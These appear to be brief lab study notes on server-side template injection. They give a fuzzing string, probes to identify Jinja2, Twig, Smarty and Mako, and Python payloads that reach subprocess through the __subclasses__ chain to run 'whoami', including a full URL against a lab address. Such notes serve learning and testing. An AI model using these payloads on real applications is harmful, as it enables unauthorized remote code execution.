- Detection by fuzzing
	- `${{<%[%'"}}%`
- Identify template engine
	- `{{7*'7'}}` - Jinja2 or Twig
	- `a{*comment*}b` - Smarty
	- `${"z".join("ab")}` - Mako
- Python injection payload:
	- `{% import os %}{{ os.system("whoami") }}`
	- `{{ ''.__class__.__mro__[1].__subclasses__() }}` 
		- `mro` is used to access parent level class
		- `subclasses` - access sub class
	- Find the `subprocess` module in the subclasses and run the command
		- `http://10.10.110.245:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}`
- [Other payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- 